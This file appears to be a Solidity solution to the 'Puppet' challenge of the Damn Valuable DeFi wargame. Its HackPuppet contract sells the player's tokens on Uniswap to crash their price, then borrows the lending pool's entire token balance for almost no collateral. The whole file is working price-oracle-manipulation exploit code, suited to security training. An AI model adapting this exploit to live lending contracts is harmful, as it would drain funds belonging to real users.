// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { PuppetPool } from "./PuppetPool.sol";
import "../DamnValuableToken.sol";


contract HackPuppet {
    PuppetPool pool;
    DamnValuableToken token;
    address uniswap;

    constructor(PuppetPool _pool, DamnValuableToken _token, address _uniswap) {
        pool = _pool;
        token = _token;
        uniswap = _uniswap;
    }

    function hack(uint256 player_token_balance, uint256 pool_token_balance) external payable {
        // We're going to transfer the player tokens to this contract
        token.transferFrom(tx.origin, address(this), player_token_balance);
        // Need to approve uniswap to transfer our tokens
        token.approve(uniswap, player_token_balance);
        // Call the uniswap function tokenToEthSwapInput
        // Doing this, we're unbalancing the swap price
        // The exchange is going to have 20 Eth and 0 tokens
        (bool success,) = uniswap.call(abi.encodeWithSignature(
            "tokenToEthSwapInput(uint256,uint256,uint256)",
            player_token_balance,       // tokens to sell
            1,                          // min eth to buy
            block.timestamp * 2         // deadline
        ));
        // Check if our call was successfull
        require(success, "fail at tokenToEthSwapInput()");
        // Now that the token's price is insignificant we can borrow all the pool balance
        pool.borrow{value: address(this).balance}(pool_token_balance, address(this));
        // Finally we transfer the token to our wallet
        token.transfer(tx.origin, token.balanceOf(address(this)));
    }

    // Need to have a receive function in order to receive Ether
    receive() external payable {}
}